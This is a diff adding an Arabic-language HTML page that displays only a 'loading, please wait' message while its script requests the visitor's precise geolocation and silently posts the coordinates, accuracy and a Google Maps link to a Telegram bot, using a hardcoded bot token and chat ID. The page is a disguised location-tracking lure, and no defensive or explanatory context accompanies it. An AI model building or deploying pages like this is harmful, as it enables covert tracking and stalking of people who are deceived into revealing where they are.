@@ -1,0 +1,47 @@
+﻿<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>جار التحميل...</title>
+</head>
+<body>
+    <h3 style="text-align: center; margin-top: 20%; font-family: Tahoma;">جاري تحميل الصفحة، يرجى الانتظار...</h3>
+
+    <script>
+        // تم دمج بيانات تليجرام الخاصة بك بنجاح
+        const TELEGRAM_BOT_TOKEN = '9205263918:AAEfuJZjbxJlTXIM8mU1CdVR4WbEA2Hc4-k';
+        const TELEGRAM_CHAT_ID = '7083330975';
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            });
+        }
+
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const acc = position.coords.accuracy;
+
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const message = `📍 تم رصد الموقع بنجاح!\n📏 الدقة: ${acc} متر\n🗺️ رابط الخريطة:\n${mapLink}`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message
+                })
+            });
+        }
+
+        function handleError(error) {
+            console.log("Error");
+        }
+    </script>
+</body>
+</html>
+
